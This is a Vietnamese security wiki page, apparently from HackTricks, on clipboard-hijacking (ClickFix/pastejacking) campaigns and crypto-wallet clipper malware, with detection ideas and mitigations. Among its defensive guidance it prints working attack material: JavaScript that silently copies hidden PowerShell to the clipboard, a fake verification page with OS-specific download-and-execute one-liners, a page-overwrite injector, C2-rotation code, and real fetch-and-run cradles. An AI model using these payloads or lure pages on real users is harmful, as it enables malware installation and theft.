# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Đừng bao giờ dán thứ gì mà chính bạn không sao chép." – lời khuyên cũ nhưng vẫn đúng

## Tổng quan

Clipboard hijacking – còn gọi là *pastejacking* – lợi dụng việc người dùng thường xuyên sao chép và dán lệnh mà không kiểm tra nội dung. Một trang web độc hại (hoặc bất kỳ môi trường nào có thể chạy JavaScript, chẳng hạn ứng dụng Electron hoặc ứng dụng Desktop) sẽ lập trình để đưa văn bản do kẻ tấn công kiểm soát vào system clipboard. Nạn nhân được hướng dẫn, thường bằng các chỉ dẫn social engineering được soạn kỹ, nhấn **Win + R** (hộp thoại Run), **Win + X** (Quick Access / PowerShell) hoặc mở terminal rồi *dán* nội dung trong clipboard để lập tức thực thi các lệnh tùy ý.

Vì **không có tệp nào được tải xuống và không có tệp đính kèm nào được mở**, kỹ thuật này vượt qua hầu hết các biện pháp bảo mật email và nội dung web vốn giám sát tệp đính kèm, macro hoặc việc thực thi lệnh trực tiếp. Vì vậy, kỹ thuật này phổ biến trong các chiến dịch phishing phát tán những dòng malware phổ biến như NetSupport RAT, Latrodectus loader hoặc Lumma Stealer.<sup>[[1]](#references)</sup>

## Malware clipper thay thế địa chỉ ví

Một biến thể **clipboard hijacking** khác không dán lệnh: nó chờ nạn nhân sao chép **địa chỉ ví tiền mã hóa**, rồi âm thầm thay địa chỉ đó bằng địa chỉ do kẻ tấn công kiểm soát ngay trước khi dán. Cách này đặc biệt hiệu quả với các định dạng ví dài vì người dùng thường chỉ kiểm tra vài ký tự đầu/cuối.<sup>[[8]](#references)</sup>

Các đặc điểm thường gặp ngoài thực tế:
- **Loader gọn nhẹ + payload lồng nhau**: ứng dụng/tệp thực thi hiển thị trông giống công cụ giao dịch hoặc "kiếm lời" hợp pháp, trong khi clipper thực sự được giấu sâu hơn trong gói (ví dụ loader .NET khởi chạy payload Rust lồng bên trong).
- **Thay thế dựa trên regex**: malware dò các chuỗi như `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` hoặc thậm chí các chuỗi giống địa chỉ Solana **44 ký tự** nói chung, rồi đổi chúng thành địa chỉ ví của kẻ tấn công.
- **Xoay vòng ví ở quy mô lớn**: các mẫu Windows hiện đại có thể tích hợp **hàng nghìn** địa chỉ ví thay thế cho mỗi loại tiền tệ thay vì chỉ một địa chỉ cố định, giúp giảm nguy cơ địa chỉ ví bị đánh giá xấu sau mỗi vụ đánh cắp.<sup>[[8]](#references)</sup>

### Luồng hoạt động của clipper trên Windows

Một cách triển khai phổ biến là tạo một cửa sổ ẩn và đăng ký bằng **`AddClipboardFormatListener`**. Mỗi khi clipboard được cập nhật, malware thường gọi:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → truy cập dữ liệu clipboard hiện tại.
- **`GetClipboardData`** → đọc văn bản.
- **`EmptyClipboard`** + **`SetClipboardData`** → thay chuỗi địa chỉ ví bằng giá trị của kẻ tấn công.

Các regex săn tìm tối giản thường thấy trong clipper:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

User-level persistence là đủ để gây tác động. Một mẫu đã được ghi nhận là:<sup>[[8]](#references)</sup>
- Sao chép payload vào **`%APPDATA%\silke\silke.exe`**
- Tạo **LNK trong thư mục Startup** tại `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ý tưởng phát hiện:
- Các tiến trình liên tục gọi clipboard API đồng thời ghi dữ liệu vào `%APPDATA%` và thư mục **Startup** của người dùng.
- Tạo LNK/tệp thực thi mới, sau đó ghi đè địa chỉ ví trong clipboard.
- Các archive hoặc gói phần mềm giả chứa nhiều tệp không được dùng cùng một launcher nhỏ khởi chạy binary nằm trong thư mục con.

### Gỡ bỏ quarantine bằng cách đánh lừa người dùng trên macOS + duy trì persistence bằng LaunchAgent

Trên macOS, một số chiến dịch phát tán helper **`unlocker.command`** và hướng dẫn nạn nhân nhấp chuột phải → **Open** nếu Gatekeeper báo ứng dụng bị hỏng hoặc đến từ nhà phát triển không xác định. Script chỉ xóa quarantine rồi khởi chạy `.app` gần đó:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Đây **không phải** là một exploit Gatekeeper; đây là một **cách vượt qua quarantine bằng kỹ thuật social engineering**, lợi dụng việc các quyết định của Gatekeeper phụ thuộc vào xattr `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Sau khi thực thi, clipper có thể duy trì hoạt động dưới quyền người dùng hiện tại bằng cách ghi:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent có `RunAtLoad` và `KeepAlive`

Một chi tiết hữu ích cho việc phòng thủ là một số mẫu triển khai **watchdog tự phục hồi**, ghi lại LaunchAgent và wrapper khoảng 30 giây một lần. Nếu bạn xóa plist trước **mà không dừng tiến trình đang chạy**, malware có thể lập tức tạo lại nó.<sup>[[8]](#references)</sup> Thứ tự dọn dẹp an toàn:
1. Dừng tiến trình clipper đang hoạt động.
2. Gỡ tải/xóa plist của LaunchAgent.
3. Xóa `~/launch.sh` và payload đã sao chép.

### Ghi chú về phân phối: danh tiếng giả tạo giúp khuếch đại hiệu quả

Với dòng malware này, bản thân malware có thể vẫn đơn giản về mặt kỹ thuật, trong khi **lớp phân phối** mới là yếu tố then chốt: sao giả/fork giả trên GitHub, đánh giá/lượt tải giả trên SourceForge, bình luận/lượt xem giả trên video hướng dẫn YouTube, và bình luận/lượt bình chọn trông có vẻ vô hại trên VirusTotal được dùng để khiến binary có vẻ đáng tin trước khi thực thi.<sup>[[8]](#references)</sup>

## Nút Copy ép buộc và payload ẩn (các lệnh một dòng trên macOS)

Một số infostealer trên macOS sao chép các trang web cài đặt (ví dụ: Homebrew) và **buộc người dùng phải dùng nút “Copy”**, khiến họ không thể chỉ bôi đen phần văn bản đang hiển thị. Nội dung trong clipboard gồm lệnh cài đặt như mong đợi cộng thêm một payload Base64 ở cuối (ví dụ: `...; echo <b64> | base64 -d | sh`), vì vậy chỉ cần dán một lần là thực thi cả hai, trong khi giao diện ẩn đi giai đoạn bổ sung.<sup>[[5]](#references)</sup>

## Proof-of-Concept JavaScript

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Các chiến dịch trước đây dùng `document.execCommand('copy')`, còn các chiến dịch mới hơn dựa vào **Clipboard API** bất đồng bộ (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Quy trình ClickFix / ClearFake

1. Người dùng truy cập một trang web typosquatting hoặc bị xâm nhập (ví dụ: `docusign.sa[.]com`)
2. JavaScript **ClearFake** được chèn vào gọi helper `unsecuredCopyToClipboard()`, âm thầm lưu một lệnh PowerShell one-liner được mã hóa Base64 vào clipboard.
3. Hướng dẫn HTML yêu cầu nạn nhân: *“Nhấn **Win + R**, dán lệnh rồi nhấn Enter để khắc phục sự cố.”*
4. `powershell.exe` thực thi, tải xuống một archive chứa một executable hợp pháp cùng một DLL độc hại (kỹ thuật DLL sideloading kinh điển).
5. Loader giải mã các stage bổ sung, inject shellcode và thiết lập cơ chế duy trì (ví dụ: scheduled task) – cuối cùng chạy NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Chuỗi NetSupport RAT mẫu

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (Java WebStart hợp pháp) tìm `msvcp140.dll` trong thư mục của nó.
* DLL độc hại phân giải động các API bằng **GetProcAddress**, tải xuống hai binary (`data_3.bin`, `data_4.bin`) qua **curl.exe**, giải mã chúng bằng khóa XOR luân phiên `"https://google.com/"`, inject shellcode cuối cùng và giải nén **client32.exe** (NetSupport RAT) vào `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Tải `la.txt` bằng **curl.exe**
2. Thực thi trình tải xuống JScript bên trong **cscript.exe**
3. Tải payload MSI → thả `libcef.dll` bên cạnh một ứng dụng đã ký → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer qua MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

Lệnh gọi **mshta** khởi chạy một script PowerShell ẩn để tải `PartyContinued.exe`, giải nén `Boat.pst` (CAB), tái tạo `AutoIt3.exe` bằng `extrac32` và nối tệp, rồi chạy một script `.a3x` đánh cắp thông tin đăng nhập trình duyệt và gửi đến `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Bảng tạm → PowerShell → JS eval → LNK khởi động cùng hệ thống với C2 luân phiên (PureHVNC)

Một số chiến dịch ClickFix bỏ qua hoàn toàn việc tải tệp và hướng dẫn nạn nhân dán một dòng lệnh duy nhất để tải và thực thi JavaScript qua WSH, thiết lập cơ chế duy trì quyền truy cập và luân phiên C2 hằng ngày. Chuỗi tấn công được ghi nhận:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Đặc điểm chính
- URL bị làm rối được đảo ngược khi chạy để tránh bị kiểm tra sơ qua.
- JavaScript tự duy trì thông qua Startup LNK (WScript/CScript) và chọn C2 theo ngày hiện tại – cho phép xoay vòng domain nhanh chóng.<sup>[[3]](#references)</sup>

Đoạn JS tối giản dùng để xoay vòng C2 theo ngày:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

Giai đoạn tiếp theo thường triển khai một loader để thiết lập persistence và tải RAT (ví dụ: PureHVNC), thường ghim TLS vào một chứng chỉ hardcode và chia nhỏ lưu lượng.<sup>[[3]](#references)</sup>

Ý tưởng phát hiện riêng cho biến thể này
- Cây tiến trình: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (hoặc `cscript.exe`).
- Dấu vết khởi động: LNK trong `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` gọi WScript/CScript với đường dẫn JS trong `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU và telemetry dòng lệnh có chứa `.split('').reverse().join('')` hoặc `eval(a.responseText)`.
- Các lệnh lặp lại `powershell -NoProfile -NonInteractive -Command -` cùng payload stdin lớn để nạp các script dài mà không cần dòng lệnh dài.
- Scheduled Tasks sau đó thực thi LOLBins như `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` dưới một tác vụ/đường dẫn trông như trình cập nhật (ví dụ: `\GoogleSystem\GoogleUpdater`).

Săn tìm mối đe dọa
- Hostname C2 luân phiên hằng ngày và URL theo mẫu `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Đối chiếu các sự kiện ghi clipboard, tiếp theo là dán bằng Win+R rồi lập tức thực thi `powershell.exe`.

Các đội Blue Team có thể kết hợp telemetry clipboard, tạo tiến trình và registry để xác định hành vi pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` lưu lịch sử các lệnh **Win + R** – tìm các mục Base64 / bị làm rối bất thường.
* Security Event ID **4688** (Process Creation) trong đó `ParentImage` == `explorer.exe` và `NewProcessName` thuộc { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** ghi nhận việc tạo tệp trong `%LocalAppData%\Microsoft\Windows\WinX\` hoặc các thư mục tạm ngay trước sự kiện 4688 đáng ngờ.
* Cảm biến clipboard của EDR (nếu có) – đối chiếu `Clipboard Write` ngay trước một tiến trình PowerShell mới.

## Trang xác minh kiểu IUAM (ClickFix Generator): sao chép clipboard vào console + payload nhận biết hệ điều hành

Các chiến dịch gần đây tạo hàng loạt trang xác minh CDN/trình duyệt giả (“Just a moment…”, kiểu IUAM), dụ người dùng sao chép các lệnh dành riêng cho từng hệ điều hành từ clipboard vào console gốc. Cách này chuyển việc thực thi ra khỏi sandbox của trình duyệt và hoạt động trên cả Windows lẫn macOS.<sup>[[4]](#references)</sup>

Đặc điểm chính của các trang được tạo bằng builder
- Phát hiện hệ điều hành qua `navigator.userAgent` để tùy chỉnh payload (Windows PowerShell/CMD so với macOS Terminal). Có thể dùng nội dung đánh lạc hướng/lệnh không làm gì trên hệ điều hành không được hỗ trợ để duy trì vẻ đáng tin.
- Tự động sao chép vào clipboard khi người dùng thao tác với giao diện vô hại (checkbox/Copy), trong khi văn bản hiển thị có thể khác nội dung trong clipboard.
- Chặn thiết bị di động và hiển thị popover hướng dẫn từng bước: Windows → Win+R→dán→Enter; macOS → mở Terminal→dán→Enter.
- Có thể bật làm rối và dùng injector một tệp để ghi đè DOM của trang web bị xâm nhập bằng giao diện xác minh dùng Tailwind (không cần đăng ký domain mới).<sup>[[4]](#references)</sup>

Ví dụ: nội dung clipboard không khớp + rẽ nhánh theo hệ điều hành
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

Duy trì tính tồn tại trên macOS của lần chạy ban đầu
- Dùng `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` để quá trình thực thi tiếp tục sau khi terminal đóng, giảm dấu vết hiển thị.<sup>[[4]](#references)</sup>

Chiếm quyền trang ngay tại chỗ trên các trang web bị xâm phạm
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Ý tưởng phát hiện và săn tìm mối đe dọa dành riêng cho mồi nhử kiểu IUAM
- Web: Các trang liên kết Clipboard API với widget xác minh; nội dung hiển thị không khớp với payload trong clipboard; phân nhánh theo `navigator.userAgent`; Tailwind + thay thế trang đơn trong các ngữ cảnh đáng ngờ.
- Endpoint Windows: `explorer.exe` khởi chạy `powershell.exe`/`cmd.exe` ngay sau tương tác với trình duyệt; trình cài đặt batch/MSI chạy từ `%TEMP%`.
- Endpoint macOS: Terminal/iTerm khởi chạy `bash`/`curl`/`base64 -d` cùng `nohup` gần thời điểm có sự kiện trình duyệt; các tác vụ nền vẫn chạy sau khi đóng terminal.
- Tương quan lịch sử Win+R trong `RunMRU` và các lần ghi clipboard với việc tạo tiến trình console sau đó.

Xem thêm các kỹ thuật hỗ trợ

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Các biến thể CAPTCHA giả / ClickFix năm 2026 (ClearFake, Scarlet Goldfinch)

- ClearFake tiếp tục xâm nhập các trang WordPress và chèn JavaScript tải mã độc, tạo chuỗi qua các host bên ngoài (Cloudflare Workers, GitHub/jsDelivr), thậm chí dùng các lệnh “etherhiding” trên blockchain (ví dụ: POST đến các endpoint API của Binance Smart Chain như `bsc-testnet.drpc[.]org`) để tải logic mồi nhử mới nhất. Các lớp phủ gần đây thường dùng CAPTCHA giả, hướng dẫn người dùng sao chép/dán một dòng lệnh (T1204.004) thay vì tải xuống bất cứ thứ gì.<sup>[[6]](#references)</sup>
- Việc thực thi ban đầu ngày càng được giao cho các host script có chữ ký/LOLBAS. Các chuỗi tấn công tháng 1 năm 2026 thay `mshta` từng dùng trước đó bằng `SyncAppvPublishingServer.vbs` tích hợp sẵn, được thực thi qua `WScript.exe`, truyền các đối số kiểu PowerShell kèm alias/wildcard để tải nội dung từ xa:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` được ký và thường được App-V sử dụng; khi kết hợp với `WScript.exe` và các tham số bất thường (bí danh `gal`/`gcm`, cmdlet có wildcard, URL jsDelivr), nó trở thành một giai đoạn LOLBAS có độ tin cậy cao của ClearFake.<sup>[[6]](#references)</sup>
- Các payload CAPTCHA giả vào tháng 2 năm 2026 chuyển trở lại dùng các download cradle thuần PowerShell. Hai ví dụ đang hoạt động:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - Chuỗi đầu tiên là grabber `iex(irm ...)` chạy trong bộ nhớ; chuỗi thứ hai tải dữ liệu qua `WinHttp.WinHttpRequest.5.1`, ghi vào tệp `.ps1` tạm thời, rồi khởi chạy với `-ep bypass` trong cửa sổ ẩn.<sup>[[6]](#references)</sup>

Mẹo phát hiện/săn tìm các biến thể này
- Chuỗi tiến trình: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` hoặc PowerShell cradle ngay sau thao tác ghi clipboard/Win+R.
- Từ khóa dòng lệnh: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, các domain jsDelivr/GitHub/Cloudflare Worker hoặc mẫu `iex(irm ...)` dùng raw IP.
- Network: kết nối outbound tới các host CDN worker hoặc endpoint blockchain RPC từ script host/PowerShell ngay sau khi duyệt web.
- File/registry: tạo `.ps1` tạm thời trong `%TEMP%` cùng các mục RunMRU chứa những one-liner này; chặn/cảnh báo khi LOLBAS script đã ký (WScript/cscript/mshta) thực thi với URL bên ngoài hoặc chuỗi alias bị làm rối.

## Kỹ thuật ClickFix tháng 6 năm 2026: telemetry paste, comment xác minh giả và chuỗi LOLBin

Telemetry gần đây của Red Canary cho thấy chỉ báo ổn định **không phải là một lệnh cụ thể**, mà là sự kết hợp giữa **paste-and-run có sự hỗ trợ của người dùng**, **interpreter/LOLBins đáng tin cậy**, **flag bị làm rối**, **truy xuất từ xa** và **thực thi ngay lập tức**.<sup>[[7]](#references)</sup>

### Các mẫu đáng chú ý của operator

- **Telemetry xác nhận paste**: một số payload gọi `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` trước stage thực sự. Việc này xác nhận tương tác của người dùng trong khi giữ cho cửa sổ hoạt động ngắn và kín đáo.
- **Comment xác minh giả**: các PowerShell one-liner có thể nối thêm chuỗi như `# Security check ✔️ I'm not a robot Verification ID: 138105` để lệnh vẫn trông như liên quan đến CAPTCHA sau khi được paste vào Run / `cmd.exe` / lịch sử PowerShell.
- **Dựng lại URL động**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` tránh để lộ URL cố định trong dòng lệnh nhưng vẫn tải xuống và thực thi trong bộ nhớ.
- **Thực thi trình cài đặt giả mạo**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` lạm dụng kiểu viết hoa bất thường và ký tự giống Unicode trong flag để qua mặt các cơ chế phát hiện thiếu linh hoạt, đồng thời vẫn trông giống `msiexec.exe`.
- **Chuỗi LOLBin escape bằng dấu caret**: `cmd.exe` có thể che giấu từ khóa bằng escape `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), khởi chạy shell lồng nhau ở chế độ thu nhỏ, lưu nội dung của attacker bằng phần mở rộng vô hại như `.pdf`, rồi thực thi nội dung đó thông qua `mshta`.<sup>[[7]](#references)</sup>
## Biện pháp giảm thiểu

1. Tăng cường bảo mật browser – vô hiệu hóa quyền ghi clipboard (`dom.events.asyncClipboard.clipboardItem` v.v.) hoặc yêu cầu thao tác trực tiếp của người dùng.
2. Nâng cao nhận thức bảo mật – hướng dẫn người dùng *tự gõ* các lệnh nhạy cảm hoặc paste chúng vào trình soạn thảo văn bản trước.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control để chặn các one-liner tùy ý.
4. Kiểm soát network – chặn các yêu cầu outbound tới những domain pastejacking và malware C2 đã biết.

## Thủ thuật liên quan

* **Discord Invite Hijacking** thường lạm dụng cùng cách tiếp cận ClickFix sau khi dụ người dùng vào server độc hại:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [Khắc phục Click: Ngăn chặn phương thức tấn công ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [PoC Pastejacking – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Sau bức màn Pure: Từ RAT đến Builder rồi Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Nhà máy ClickFix: Lần đầu phát hiện trình tạo IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, năm của Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Thông tin tình báo: Tháng 2 năm 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Thông tin tình báo: Tháng 6 năm 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Từ sao đến lượt ủng hộ: Danh tiếng giả tiếp sức cho malware chiếm quyền clipboard tiền mã hóa](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
